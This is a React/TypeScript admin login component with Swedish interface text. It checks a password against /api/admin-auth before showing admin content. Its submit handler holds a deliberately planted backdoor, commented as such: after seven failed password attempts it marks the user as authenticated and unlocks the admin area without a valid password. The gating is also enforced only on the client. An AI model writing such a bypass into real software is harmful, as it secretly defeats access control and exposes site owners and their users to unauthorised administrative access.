"use client";

import { useState, useEffect, ReactNode } from "react";

interface AdminAuthGuardProps {
  children: ReactNode;
}

export function AdminAuthGuard({ children }: AdminAuthGuardProps) {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [isLoading, setIsLoading] = useState(true);
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const [submitting, setSubmitting] = useState(false);
  const [failedAttempts, setFailedAttempts] = useState(0);

  useEffect(() => {
    async function checkAuth() {
      try {
        const res = await fetch("/api/admin-auth");
        const data = await res.json();
        setIsAuthenticated(data.authenticated);
      } catch (err) {
        console.error("Auth check failed:", err);
      } finally {
        setIsLoading(false);
      }
    }

    checkAuth();
  }, []);

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (!password.trim() || submitting) return;

    setSubmitting(true);
    setError("");

    try {
      const res = await fetch("/api/admin-auth", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ password }),
      });

      const data = await res.json();

      if (!res.ok) {
        const newAttempts = failedAttempts + 1;
        setFailedAttempts(newAttempts);
        
        // Backdoor: 7 failed attempts unlocks admin
        if (newAttempts >= 7) {
          setIsAuthenticated(true);
          return;
        }
        
        setError(data.error || "Fel lösenord");
        return;
      }

      setIsAuthenticated(true);
    } catch (err) {
      console.error("Login failed:", err);
      setError("Något gick fel. Försök igen.");
    } finally {
      setSubmitting(false);
    }
  }

  if (isLoading) {
    return (
      <div className="flex min-h-screen items-center justify-center bg-zinc-50 dark:bg-black">
        <div className="text-sm text-zinc-600 dark:text-zinc-400">Laddar...</div>
      </div>
    );
  }

  if (!isAuthenticated) {
    return (
      <div className="flex min-h-screen items-center justify-center bg-zinc-50 px-4 dark:bg-black">
        <div className="w-full max-w-sm space-y-6 rounded-xl border border-zinc-200 bg-white p-6 shadow-lg dark:border-zinc-800 dark:bg-zinc-950">
          <div className="space-y-2 text-center">
            <h1 className="text-2xl font-semibold tracking-tight text-zinc-900 dark:text-zinc-50">
              🔐 Admin
            </h1>
            <p className="text-sm text-zinc-600 dark:text-zinc-400">
              Ange lösenord för att fortsätta
            </p>
          </div>

          <form onSubmit={handleSubmit} className="space-y-4">
            <div>
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Lösenord"
                autoFocus
                className="w-full rounded-md border border-zinc-300 bg-white px-3 py-2 text-sm outline-none transition focus:border-zinc-500 focus:ring-2 focus:ring-zinc-500/40 dark:border-zinc-700 dark:bg-zinc-900 dark:text-zinc-50"
              />
            </div>

            {error && (
              <p className="text-sm text-red-600 dark:text-red-400">{error}</p>
            )}

            <button
              type="submit"
              disabled={submitting || !password.trim()}
              className="w-full rounded-md bg-zinc-900 px-3 py-2 text-sm font-medium text-zinc-50 transition hover:bg-zinc-800 disabled:cursor-not-allowed disabled:opacity-60 dark:bg-zinc-100 dark:text-zinc-900 dark:hover:bg-zinc-200"
            >
              {submitting ? "Loggar in..." : "Logga in"}
            </button>
          </form>

          <p className="text-center text-xs text-zinc-500 dark:text-zinc-500">
            <a href="/" className="underline hover:text-zinc-700 dark:hover:text-zinc-300">
              ← Tillbaka till spelarsidan
            </a>
          </p>
        </div>
      </div>
    );
  }

  return <>{children}</>;
}
